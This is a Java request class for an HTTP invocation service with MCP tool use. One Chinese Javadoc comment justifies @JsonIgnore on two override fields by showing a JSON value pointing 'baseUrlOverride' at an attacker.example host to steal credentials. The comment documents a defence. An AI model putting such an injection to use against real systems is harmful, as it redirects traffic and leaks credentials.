package cn.wubo.loom.http.core.invoke;

import com.fasterxml.jackson.annotation.JsonIgnore;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Input to {@link InvokeService#invoke(InvokeRequest)}.
 *
 * Captures everything the caller wants to do, before the 16-step pipeline resolves
 * profile / system / endpoint state. All fields are optional except {@code system},
 * {@code method}, and {@code path}.
 *
 * Mutable shape so callers (e.g. the {@code invokeEndpoint} MCP tool) can construct
 * one record progressively from JSON argument maps.
 */
public class InvokeRequest {

    private String system;
    private String method;
    private String path;
    private Map<String, Object> params = new LinkedHashMap<>();
    private Object body;
    /**
     * Raw body string — sent verbatim without Jackson re-serialization. Wins
     * over {@link #body} when both are set. Use for non-JSON-object bodies
     * (arrays, bare strings, CSV, NDJSON). See InvokeTools for the contract
     * that rejects ambiguous body+bodyRaw combinations up front.
     */
    private String bodyRaw;
    private Map<String, String> headers = new LinkedHashMap<>();
    private List<Map<String, Object>> assertions;
    private Map<String, String> extract;
    private String responseMode;
    private Long timeoutMs;

    /**
     * Per-request base URL override — wins over {@code system.baseUrl}.
     *
     * <p><b>为什么需要它</b>:ad-hoc 调用(无预定义 system 的裸 URL 调用)过去靠"把
     * baseUrl 写进共享的 {@code _ad_hoc} system 对象"来路由。那是<b>进程级共享可变状态</b>:
     * {@link InvokeService#invoke} 按 name 重新解析该 system 并读它的 baseUrl/authProfile,
     * 整个读取发生在调用方的写锁<b>之外</b> ⇒ 两个并发 ad-hoc 调用会互相覆盖对方的
     * 目标主机与凭据(A 的 token 可能发到 B 的 host)。把路由参数随请求传递后,共享对象
     * 不再被修改,并发调用之间没有任何共享可变状态。
     *
     * <p>{@code null}/空白 = 不覆盖,沿用 system 上的值(既有 profile/system 路径行为不变)。
     *
     * <p><b>{@code @JsonIgnore} 不是可选的 —— 它就是安全边界</b>:本对象会被
     * {@code mapper().convertValue(userJson, InvokeRequest.class)} 直接绑定
     * (loom-http-mcp 的 {@code http_batch} 工具,{@code LoomHttpMcpService.java:85};
     * 本仓生产代码里只有这一处做这种绑定),而 Jackson 按 setter 名匹配属性。
     * 不加这个注解,调用方只要在 operation 里写
     * {@code "baseUrlOverride": "http://attacker.example"} 就能把一个已授权 system 的
     * 流量改道到任意主机,并叠加任意已注册 profile 的凭据 —— 凭据外泄 + 越权。
     * 因此这两个字段<b>只允许程序内设置</b>(唯一写入方是 ad-hoc 调用方),
     * 任何反序列化路径都必须忽略它们。回归锁:{@code InvokeRequestBindingTest}。
     */
    @JsonIgnore
    private String baseUrlOverride;

    /**
     * Per-request auth profile name override — wins over {@code system.authProfile}.
     *
     * <p>与 {@link #baseUrlOverride} 同理:随请求传递,不写共享 system。
     * 解析出的 profile 同时决定域名白名单({@code profile.allowedDomains}),
     * 所以凭据与白名单始终来自同一次调用。
     *
     * <p>与 {@link #baseUrlOverride} 一样<b>不可从 JSON 绑定</b>(安全边界,非风格选择)。
     */
    @JsonIgnore
    private String authProfileOverride;

    public String getSystem() { return system; }
    public void setSystem(String s) { this.system = s; }

    public String getMethod() { return method; }
    public void setMethod(String m) { this.method = m; }

    public String getPath() { return path; }
    public void setPath(String p) { this.path = p; }

    public Map<String, Object> getParams() { return params; }
    public void setParams(Map<String, Object> p) { this.params = p == null ? new LinkedHashMap<>() : p; }

    public Object getBody() { return body; }
    public void setBody(Object b) { this.body = b; }

    public String getBodyRaw() { return bodyRaw; }
    public void setBodyRaw(String r) { this.bodyRaw = r; }

    public Map<String, String> getHeaders() { return headers; }
    public void setHeaders(Map<String, String> h) { this.headers = h == null ? new LinkedHashMap<>() : h; }

    public List<Map<String, Object>> getAssertions() { return assertions; }
    public void setAssertions(List<Map<String, Object>> a) { this.assertions = a; }

    public Map<String, String> getExtract() { return extract; }
    public void setExtract(Map<String, String> e) { this.extract = e; }

    public String getResponseMode() { return responseMode; }
    public void setResponseMode(String r) { this.responseMode = r; }

    public Long getTimeoutMs() { return timeoutMs; }
    public void setTimeoutMs(Long t) { this.timeoutMs = t; }

    public String getBaseUrlOverride() { return baseUrlOverride; }
    public void setBaseUrlOverride(String u) { this.baseUrlOverride = u; }

    public String getAuthProfileOverride() { return authProfileOverride; }
    public void setAuthProfileOverride(String p) { this.authProfileOverride = p; }
}
